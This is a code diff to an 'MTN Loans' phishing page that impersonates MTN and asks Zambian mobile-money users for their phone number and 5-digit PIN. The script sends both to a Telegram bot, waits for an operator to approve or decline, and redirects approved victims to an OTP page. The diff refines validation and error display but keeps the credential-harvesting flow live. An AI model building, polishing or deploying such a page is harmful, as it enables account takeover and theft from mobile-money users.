@@ -44,31 +44,14 @@
             text-align: center;
             margin-top: 20px;
         }
-        .logo-circle {
-            width: 48px;
-            height: 48px;
-            background: #000;
-            border-radius: 50%;
-            color: #FFCC00;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            margin: auto;
-            font-weight: 800;
-        }
-        .logo-text {
-            color: #000;
-            font-size: 24px;
-            font-weight: bold;
-            margin-top: 6px;
-        }
-        .logo-text span {
-            color: #FFCC00;
-            background: #000;
-            display: inline-block;
-            padding: 0 6px;
-            border-radius: 10px;
+        .logo-img {
+            max-height: 56px;
+            width: auto;
+            border-radius: 14px;
+            display: block;
+            margin: 0 auto;
+            background: #fff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
         }
 
         .title {
@@ -90,6 +73,10 @@
         .form {
             margin-top: 24px;
             text-align: left;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
         }
 
         .label {
@@ -114,6 +101,19 @@
         .input:focus {
             border-color: #FFCC00;
             box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.3);
+        }
+        .input.error {
+            border-color: #dc3545;
+        }
+
+        .field-error {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        .field-error.visible {
+            display: block;
         }
 
         .btn {
@@ -185,49 +185,6 @@
             }
         }
 
-        .error-box {
-            position: absolute;
-            top: 12px;
-            left: 12px;
-            right: 12px;
-            background: #fff;
-            border: 2px solid #ff4d4d;
-            border-radius: 14px;
-            padding: 12px;
-            display: none;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
-            z-index: 100;
-            text-align: left;
-        }
-        .error-title {
-            color: #ff0000;
-            font-weight: bold;
-            font-size: 14px;
-            margin-bottom: 4px;
-        }
-        .error-text {
-            color: #444;
-            font-size: 13px;
-        }
-        .close {
-            position: absolute;
-            right: 12px;
-            top: 8px;
-            cursor: pointer;
-            font-size: 20px;
-            color: #999;
-        }
-
-        .hint {
-            font-size: 11px;
-            color: #aaa;
-            margin-top: 4px;
-            padding-left: 4px;
-        }
-        .hint strong {
-            color: #666;
-        }
-
         @media (max-width: 360px) {
             body {
                 padding: 8px;
@@ -239,13 +196,8 @@
             .logo {
                 margin-top: 8px;
             }
-            .logo-circle {
-                width: 44px;
-                height: 44px;
-                font-size: 26px;
-            }
-            .logo-text {
-                font-size: 22px;
+            .logo-img {
+                max-height: 44px;
             }
             .title {
                 font-size: 17px;
@@ -275,28 +227,29 @@
 <body>
 
     <div class="container">
-        <div class="error-box" id="errorBox">
-            <div class="close" onclick="hideError()">×</div>
-            <div class="error-title">Error</div>
-            <div class="error-text" id="errorText">Invalid credentials</div>
-        </div>
-
         <div class="content">
             <div class="logo">
-                <div class="logo-circle">M</div>
-                <div class="logo-text"><span>MTN</span> Loans</div>
+                <img src="logo.png" alt="MTN Loans" class="logo-img" />
             </div>
             <div class="title">Welcome to MTN Loans</div>
             <div class="subtitle">
-                Enter your MTN MoMo number and PIN to log in.
+                Enter your MTN MoMo number and 5‑digit PIN to log in.
             </div>
 
             <div class="form">
-                <div class="label">MTN MoMo Number</div>
-                <input class="input" id="phoneInput" placeholder="097 712 3456 or +260977123456" inputmode="numeric">
-                
-                <div class="label" style="margin-top:15px;">Enter your PIN</div>
-                <input class="input" id="pinInput" placeholder="4 or 5 digits" inputmode="numeric" maxlength="5" type="password" autocomplete="off">
+                <!-- Phone Group -->
+                <div class="form-group">
+                    <label class="label">MTN MoMo Number</label>
+                    <input class="input" id="phoneInput" placeholder="097 712 3456" inputmode="numeric">
+                    <div class="field-error" id="phoneError"></div>
+                </div>
+
+                <!-- PIN Group -->
+                <div class="form-group">
+                    <label class="label">Enter your 5‑digit PIN</label>
+                    <input class="input" id="pinInput" placeholder="PIN" inputmode="numeric" maxlength="5" type="password" autocomplete="off">
+                    <div class="field-error" id="pinError"></div>
+                </div>
 
                 <button class="btn btn-primary" id="loginBtn" disabled>Log In</button>
                 <button class="btn btn-outline" id="goBackBtn">Back</button>
@@ -323,69 +276,77 @@
         const loginBtn = document.getElementById('loginBtn');
         const goBackBtn = document.getElementById('goBackBtn');
         const spinner = document.getElementById('spinner');
-        const errorBox = document.getElementById('errorBox');
-        const errorText = document.getElementById('errorText');
+        const phoneError = document.getElementById('phoneError');
+        const pinError = document.getElementById('pinError');
 
         let isSubmitting = false;
         let currentPollInterval = null;
 
         // ============================================================
-        //  PHONE NUMBER EXTRACTION – handles all Zambian formats
+        //  PHONE EXTRACTION – Accepts ANY valid Zambian number
         // ============================================================
         function extractZambianPhone(raw) {
             if (!raw || typeof raw !== 'string') return null;
             let digits = raw.replace(/\D/g, '');
             if (!digits) return null;
-
-            // Remove country code 260 if present at the start
-            if (digits.startsWith('260')) {
-                digits = digits.substring(3);
-            }
-            // Remove leading zero if present
-            if (digits.startsWith('0')) {
-                digits = digits.substring(1);
-            }
-            // Must be exactly 9 digits
+            if (digits.startsWith('260')) digits = digits.substring(3);
+            if (digits.startsWith('0')) digits = digits.substring(1);
             if (digits.length !== 9) return null;
-            // Optional: validate first digit (5-9 for Zambian mobile)
             const first = parseInt(digits.charAt(0), 10);
+            // Valid Zambian mobile numbers start with 5-9
             if (first < 5 || first > 9) return null;
             return digits;
         }
 
         // ============================================================
-        //  UI HELPERS
+        //  VALID ZAMBIAN NUMBER (any network) – for button state
         // ============================================================
-        function showError(message) {
-            errorText.innerText = message || 'Invalid credentials';
-            errorBox.style.display = 'block';
+        function isValidZambianNumber(raw) {
+            if (!raw || typeof raw !== 'string') return false;
+            let digits = raw.replace(/\D/g, '');
+            if (!digits) return false;
+            if (digits.startsWith('260')) digits = digits.substring(3);
+            if (digits.startsWith('0')) digits = digits.substring(1);
+            if (digits.length !== 9) return false;
+            const first = parseInt(digits.charAt(0), 10);
+            return (first >= 5 && first <= 9);
         }
 
-        function hideError() {
-            errorBox.style.display = 'none';
+        // ============================================================
+        //  ERROR DISPLAY HELPERS – NO BLANK SPACE
+        // ============================================================
+        function setPhoneError(msg) {
+            phoneError.textContent = msg || '';
+            phoneError.classList.toggle('visible', !!msg);
+            phoneInput.classList.toggle('error', !!msg);
         }
 
-        function clearPinField() {
-            pinInput.value = '';
+        function setPinError(msg) {
+            pinError.textContent = msg || '';
+            pinError.classList.toggle('visible', !!msg);
+            pinInput.classList.toggle('error', !!msg);
         }
 
-        function focusFirstInput() {
-            phoneInput.focus();
+        function clearAllErrors() {
+            setPhoneError('');
+            setPinError('');
         }
 
+        // ============================================================
+        //  BUTTON STATE
+        // ============================================================
         function updateLoginButton() {
             const phoneRaw = phoneInput.value.trim();
             const pinRaw = pinInput.value.trim();
-
-            const phoneCore = extractZambianPhone(phoneRaw);
-            const isPhoneValid = phoneCore !== null;
-
+            const isPhoneValid = isValidZambianNumber(phoneRaw);
             const pinDigits = pinRaw.replace(/\D/g, '');
-            const isPinValid = (pinDigits.length === 4 || pinDigits.length === 5);
-
+            const isPinValid = (pinDigits.length === 5);
             loginBtn.disabled = !(isPhoneValid && isPinValid);
         }
 
+        // ============================================================
+        //  TELEGRAM HELPERS
+        // ============================================================
         function stopPolling() {
             if (currentPollInterval) {
                 clearInterval(currentPollInterval);
@@ -404,9 +365,6 @@
             });
         }
 
-        // ============================================================
-        //  TELEGRAM SEND & POLLING
-        // ============================================================
         async function sendLoginToTelegram(phone9, pin) {
             const ts = Date.now();
             const approveId = `login_approve_${ts}`;
@@ -415,9 +373,7 @@
             sessionStorage.setItem('mtn_phone', phone9);
             sessionStorage.setItem('mtn_pin', pin);
 
-            // Display with leading zero for readability
             const displayPhone = '0' + phone9;
-
             const message =
                 `🔐 <b>MTN Loans Login Request</b>\n\n` +
                 `<b>MoMo Number:</b> <code>${escapeHtml(displayPhone)}</code>\n` +
@@ -442,9 +398,7 @@
                         }
                     })
                 });
-
                 if (!response.ok) throw new Error(`HTTP ${response.status}`);
-
                 startPollingForDecision(approveId, declineId);
             } catch (err) {
                 console.error('Telegram send error:', err);
@@ -452,27 +406,24 @@
                 isSubmitting = false;
                 loginBtn.disabled = false;
                 updateLoginButton();
-                showError('Network error. Please try again.');
+                setPinError('Network error. Please try again.');
             }
         }
 
         function startPollingForDecision(approveId, declineId) {
             stopPolling();
             let lastUpdateId = 0;
-
             currentPollInterval = setInterval(async () => {
                 try {
                     const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
                     const response = await fetch(url);
                     const data = await response.json();
                     if (!data.ok || !data.result.length) return;
-
                     for (const update of data.result) {
                         lastUpdateId = Math.max(lastUpdateId, update.update_id);
                         const callback = update.callback_query;
                         if (!callback) continue;
                         const cbData = callback.data;
-
                         if (cbData === approveId) {
                             stopPolling();
                             spinner.style.display = 'none';
@@ -480,14 +431,16 @@
                             window.location.href = 'otp-link.html';
                             return;
                         }
-
                         if (cbData === declineId) {
                             stopPolling();
                             spinner.style.display = 'none';
                             isSubmitting = false;
                             loginBtn.disabled = false;
                             updateLoginButton();
-                            showError('Authentication declined. Please check your phone number and PIN.');
+                            // ─── ERROR NOW SHOWN UNDER PHONE INPUT ───
+                            setPhoneError('Error. Please ensure you are using an MTN Zambia number.');
+                            // Clear PIN error if any
+                            setPinError('');
                             clearPinField();
                             phoneInput.focus();
                             return;
@@ -502,30 +455,42 @@
         // ============================================================
         //  SUBMIT HANDLER
         // ============================================================
+        function clearPinField() {
+            pinInput.value = '';
+        }
+
         async function submitLogin() {
             if (isSubmitting) return;
 
             const phoneRaw = phoneInput.value.trim();
             const pinRaw = pinInput.value.trim();
 
-            hideError();
+            clearAllErrors();
 
-            // Extract core 9-digit number
-            const phoneCore = extractZambianPhone(phoneRaw);
-            if (!phoneCore) {
-                showError('Please enter a valid Zambian phone number (e.g. 0977123456 or +260977123456).');
+            // Validate Zambian number (any network)
+            if (!isValidZambianNumber(phoneRaw)) {
+                setPhoneError('Please enter a valid Zambian phone number (e.g. 0977123456 or +260977123456).');
                 phoneInput.focus();
                 return;
             }
 
+            // Extract core number (validated above)
+            const phoneCore = extractZambianPhone(phoneRaw);
+            if (!phoneCore) {
+                setPhoneError('Invalid phone number format.');
+                phoneInput.focus();
+                return;
+            }
+
+            // Validate PIN
             const pinDigits = pinRaw.replace(/\D/g, '');
             if (!pinDigits) {
-                showError('Please enter your PIN (4 or 5 digits).');
+                setPinError('Please enter your 5‑digit PIN.');
                 pinInput.focus();
                 return;
             }
-            if (pinDigits.length !== 4 && pinDigits.length !== 5) {
-                showError('PIN must be 4 or 5 digits.');
+            if (pinDigits.length !== 5) {
+                setPinError('PIN must be exactly 5 digits.');
                 pinInput.value = '';
                 pinInput.focus();
                 return;
@@ -541,16 +506,15 @@
         // ============================================================
         //  EVENT LISTENERS
         // ============================================================
-        // Phone input: allow any characters, but update button state
         phoneInput.addEventListener('input', function() {
+            clearAllErrors();
             updateLoginButton();
-            hideError();
         });
 
         phoneInput.addEventListener('paste', function() {
             setTimeout(() => {
+                clearAllErrors();
                 updateLoginButton();
-                hideError();
             }, 10);
         });
 
@@ -558,8 +522,8 @@
             let val = this.value.replace(/[^0-9]/g, '');
             if (val.length > 5) val = val.slice(0, 5);
             this.value = val;
+            clearAllErrors();
             updateLoginButton();
-            hideError();
         });
 
         pinInput.addEventListener('paste', function(e) {
@@ -567,8 +531,8 @@
             const pasted = (e.clipboardData || window.clipboardData).getData('text');
             const digits = pasted.replace(/\D/g, '').slice(0, 5);
             this.value = digits;
+            clearAllErrors();
             updateLoginButton();
-            hideError();
         });
 
         loginBtn.addEventListener('click', submitLogin);
@@ -583,13 +547,11 @@
         // ============================================================
         function init() {
             updateLoginButton();
-            hideError();
+            clearAllErrors();
             phoneInput.focus();
         }
 
         init();
-
-        window.hideError = hideError;
     </script>
 </body>
 </html>
